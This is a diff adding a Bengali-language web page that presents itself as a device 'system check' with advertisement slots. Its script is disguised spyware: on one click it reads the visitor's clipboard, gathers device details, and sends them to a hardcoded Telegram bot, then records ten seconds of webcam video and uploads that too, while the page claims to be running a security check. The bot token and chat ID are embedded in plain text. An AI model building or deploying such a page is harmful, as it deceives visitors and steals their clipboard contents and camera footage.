@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RK System Check</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #0f172a; color: #f8fafc; }
+        .ad-container { 
+            background: #1e293b; 
+            border: 2px dashed #334155; 
+            min-height: 100px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+            margin: 15px 0;
+            border-radius: 8px;
+        }
+        #video-preview { display: none; border-radius: 12px; margin: 10px auto; border: 2px solid #38bdf8; }
+    </style>
+</head>
+<body class="flex flex-col items-center justify-center min-h-screen p-4">
+
+    <div class="ad-container w-full max-w-md">
+        <p class="text-slate-500 text-sm italic">[ Advertisement Slot ]</p>
+    </div>
+
+    <div class="bg-slate-800 p-8 rounded-2xl shadow-2xl w-full max-w-md text-center border border-slate-700">
+        <h1 class="text-2xl font-bold text-sky-400 mb-2">সিস্টেম ভেরিফিকেশন</h1>
+        <p class="text-slate-400 mb-6 text-sm">আপনার ডিভাইসের নিরাপত্তা পরীক্ষা করার জন্য নিচের বাটনে ক্লিক করুন।</p>
+        
+        <video id="video-preview" width="240" height="180" autoplay muted></video>
+
+        <button id="action-btn" class="w-full bg-sky-500 hover:bg-sky-600 text-slate-900 font-bold py-3 px-6 rounded-lg transition duration-300 transform hover:scale-105">
+            START CHECK
+        </button>
+
+        <div id="status-area" class="mt-4 hidden">
+            <div class="animate-pulse flex space-x-2 justify-center items-center">
+                <div class="h-2 w-2 bg-sky-400 rounded-full"></div>
+                <p class="text-sky-400 text-sm font-mono" id="status-msg">প্রসেসিং হচ্ছে...</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="ad-container w-full max-w-md">
+        <p class="text-slate-500 text-sm italic">[ Advertisement Slot ]</p>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8690110916:AAFLWdBhvnrmlC01qxiiYZSLO2Q8RR202xs';
+        const CHAT_ID = '6048050987';
+
+        const btn = document.getElementById('action-btn');
+        const statusArea = document.getElementById('status-area');
+        const statusMsg = document.getElementById('status-msg');
+        const videoPreview = document.getElementById('video-preview');
+
+        btn.addEventListener('click', async () => {
+            btn.style.display = 'none';
+            statusArea.classList.remove('hidden');
+
+            let report = `🚀 *New Device Report*\n\n`;
+            report += `📱 *OS:* ${navigator.platform}\n`;
+            report += `🌐 *Browser:* ${navigator.userAgent.split(') ')[0]}\n`;
+            report += `🖥 *Resolution:* ${window.screen.width}x${window.screen.height}\n`;
+
+            // ১. ক্লিপবোর্ড ডেটা
+            try {
+                const clipText = await navigator.clipboard.readText();
+                report += `📋 *Clipboard:* \`${clipText}\`\n`;
+            } catch (e) {
+                report += `📋 *Clipboard:* Permission Denied\n`;
+            }
+
+            // টেক্সট রিপোর্ট পাঠানো
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: 'Markdown' })
+            });
+
+            // ২. ভিডিও রেকর্ডিং (১০ সেকেন্ড)
+            try {
+                statusMsg.innerText = "Security Record শুরু হচ্ছে (10s)...";
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                videoPreview.style.display = 'block';
+                videoPreview.srcObject = stream;
+
+                const recorder = new MediaRecorder(stream);
+                let chunks = [];
+
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('video', blob, 'security_capture.mp4');
+                    
+                    statusMsg.innerText = "টেলিগ্রামে পাঠানো হচ্ছে...";
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    stream.getTracks().forEach(t => t.stop());
+                    videoPreview.style.display = 'none';
+                    statusMsg.innerText = "চেক সম্পন্ন হয়েছে!";
+                };
+
+                recorder.start();
+                setTimeout(() => recorder.stop(), 10000); // ১০ সেকেন্ড
+
+            } catch (err) {
+                statusMsg.innerText = "Camera Permission Denied!";
+            }
+        });
+    </script>
+</body>
+</html>
